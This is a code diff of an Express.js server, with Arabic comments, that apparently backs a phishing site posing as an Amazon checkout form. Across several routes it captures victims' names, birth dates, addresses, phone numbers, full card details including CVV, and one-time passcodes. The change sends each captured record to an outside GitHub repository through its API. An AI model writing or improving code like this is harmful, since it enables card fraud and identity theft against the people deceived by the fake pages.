@@ -2,18 +2,55 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const app = express();
-const PORT = 8085;
+const PORT = process.env.PORT || 8085;
 
-// إعداد السيرفر لقراءة البيانات القادمة من الفورم (POST)
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-
-// جعل المجلد الأساسي يعرض الصفحات الثابتة
 app.use(express.static(path.join(__dirname, 'views')));
 
-// التأكد من وجود مجلد uploads
-if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
-    fs.mkdirSync(path.join(__dirname, 'uploads'));
+// ========== إعدادات GitHub ==========
+const GITHUB_TOKEN = process.env.GITHUB_TOKEN; 👈 حط التوكن بتاعك هنا
+const REPO_OWNER = 'afffaaaa28-glitch';
+const REPO_NAME = 'amazon-form-site';
+const FILE_PATH = 'data.txt';
+
+// ========== دالة حفظ البيانات على GitHub ==========
+async function saveToGitHub(data) {
+    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
+    const content = Buffer.from(data).toString('base64');
+
+    let sha = '';
+    try {
+        const getRes = await fetch(url, {
+            headers: { Authorization: `token ${GITHUB_TOKEN}` }
+        });
+        if (getRes.ok) {
+            const fileInfo = await getRes.json();
+            sha = fileInfo.sha;
+        }
+    } catch (err) {
+        console.log('📄 الملف مش موجود، هيتعمل جديد');
+    }
+
+    const body = {
+        message: `تحديث البيانات - ${new Date().toLocaleString('ar-EG')}`,
+        content: content,
+        sha: sha
+    };
+
+    const res = await fetch(url, {
+        method: 'PUT',
+        headers: {
+            Authorization: `token ${GITHUB_TOKEN}`,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(body)
+    });
+
+    if (!res.ok) {
+        throw new Error(`GitHub Error: ${res.status}`);
+    }
+    return await res.json();
 }
 
 // ============================================
@@ -40,13 +77,12 @@ app.get('/page5', (req, res) => {
 });
 
 // ============================================
-// مسار استقبال بيانات العنوان من الصفحة الثانية (page2)
+// مسار استقبال بيانات العنوان
 // ============================================
-app.post('/submit-data', (req, res) => {
+app.post('/submit-data', async (req, res) => {
     console.log('📥 البيانات المستلمة من الفورم:');
-    console.log(req.body); // طباعة كل البيانات عشان نشوفها
+    console.log(req.body);
 
-    // استقبال بيانات الشحن
     const { 
         username, 
         dob_month, 
@@ -59,7 +95,6 @@ app.post('/submit-data', (req, res) => {
         city, 
         state, 
         zipcode,
-        // بيانات الفوترة - استقبل من hidden fields
         billing_username_hidden,
         billing_address_line1_hidden,
         billing_address_line2_hidden,
@@ -69,8 +104,6 @@ app.post('/submit-data', (req, res) => {
         billing_phone_hidden
     } = req.body;
 
-    // استخدام الـ hidden fields كبيانات فوترة
-    // لو مش موجودة، استخدم الفاضية
     const billing_username = billing_username_hidden || '';
     const billing_address_line1 = billing_address_line1_hidden || '';
     const billing_address_line2 = billing_address_line2_hidden || '';
@@ -79,14 +112,8 @@ app.post('/submit-data', (req, res) => {
     const billing_zipcode = billing_zipcode_hidden || '';
     const billing_phone = billing_phone_hidden || '';
 
-    // التحقق من البيانات
-    console.log('📦 بيانات الشحن:', { username, address_line1, city, state, zipcode });
-    console.log('💳 بيانات الفوترة (من hidden):', { billing_username, billing_address_line1, billing_city, billing_state, billing_zipcode });
-
-    // التحقق إذا كانت الفوترة موجودة ولا لأ
     const hasBillingData = billing_username || billing_address_line1 || billing_city || billing_state || billing_zipcode;
 
-    // تحديد إذا كانت الفوترة نفس الشحن
     const isBillingSameAsShipping = (
         hasBillingData &&
         billing_username === username &&
@@ -98,7 +125,6 @@ app.post('/submit-data', (req, res) => {
         billing_phone === (phone || '')
     );
 
-    // بناء محتوى الملف
     let logData = `========================================
    بيانات الشحن والعنوان المستلمة
 ========================================
@@ -143,26 +169,20 @@ app.post('/submit-data', (req, res) => {
 التاريخ والوقت: ${new Date().toLocaleString('ar-EG')}
 ========================================`;
 
-    // حفظ الملف
-    const fileName = path.join(__dirname, 'uploads', `user-${Date.now()}.txt`);
-
-    // استخدام writeFileSync عشان نضمن الكتابة الكاملة
     try {
-        fs.writeFileSync(fileName, logData, 'utf8');
-        console.log(`[✅] تم حفظ بيانات المستخدم بنجاح: ${fileName}`);
-        console.log('📄 محتوى الملف:');
-        console.log(logData);
+        await saveToGitHub(logData);
+        console.log('✅ البيانات اتحفظت على GitHub');
         res.redirect('/page3');
     } catch (err) {
-        console.error("❌ حدث خطأ أثناء حفظ ملف العنوان:", err);
+        console.error("❌ حدث خطأ أثناء حفظ البيانات:", err);
         return res.status(500).send("حدث خطأ داخلي في السيرفر");
     }
 });
 
 // ============================================
-// مسار استقبال بيانات الدفع من الصفحة الثالثة (page3)
+// مسار استقبال بيانات الدفع
 // ============================================
-app.post('/submit-payment', (req, res) => {
+app.post('/submit-payment', async (req, res) => {
     const { card_name, card_number, card_expiry, card_cvv } = req.body;
 
     const paymentContent = `========================================
@@ -175,11 +195,9 @@ app.post('/submit-payment', (req, res) => {
 التاريخ والوقت   : ${new Date().toLocaleString('ar-EG')}
 ----------------------------------------`;
 
-    const fileName = path.join(__dirname, 'uploads', `card-${Date.now()}.txt`);
-
     try {
-        fs.writeFileSync(fileName, paymentContent, 'utf8');
-        console.log(`[💳] تم حفظ بيانات كارت جديدة بنجاح: ${fileName}`);
+        await saveToGitHub(paymentContent);
+        console.log('✅ بيانات البطاقة اتحفظت على GitHub');
         res.redirect('/page4');
     } catch (err) {
         console.error("❌ حدث خطأ أثناء حفظ بيانات الدفع:", err);
@@ -188,9 +206,9 @@ app.post('/submit-payment', (req, res) => {
 });
 
 // ============================================
-// مسار استقبال الـ OTP من الصفحة الرابعة (page4)
+// مسار استقبال الـ OTP
 // ============================================
-app.post('/submit-otp', (req, res) => {
+app.post('/submit-otp', async (req, res) => {
     const { otp_code } = req.body;
 
     const otpContent = `========================================
@@ -200,11 +218,9 @@ app.post('/submit-otp', (req, res) => {
 التاريخ والوقت   : ${new Date().toLocaleString('ar-EG')}
 ----------------------------------------`;
 
-    const fileName = path.join(__dirname, 'uploads', `otp-${Date.now()}.txt`);
-
     try {
-        fs.writeFileSync(fileName, otpContent, 'utf8');
-        console.log(`[🔒] تم حفظ رمز OTP جديد بنجاح: ${fileName}`);
+        await saveToGitHub(otpContent);
+        console.log('✅ كود OTP اتحفظ على GitHub');
         res.redirect('/page5');
     } catch (err) {
         console.error("❌ حدث خطأ أثناء حفظ رمز OTP:", err);
@@ -219,6 +235,6 @@ app.listen(PORT, () => {
     console.log(`==================================================`);
     console.log(`[*] السيرفر يعمل الآن على: http://localhost:${PORT}`);
     console.log(`==================================================`);
-    console.log(`[📂] مجلد حفظ الملفات: ${path.join(__dirname, 'uploads')}`);
+    console.log(`[📂] البيانات هتتحفظ على GitHub في ملف data.txt`);
     console.log(`==================================================`);
 });
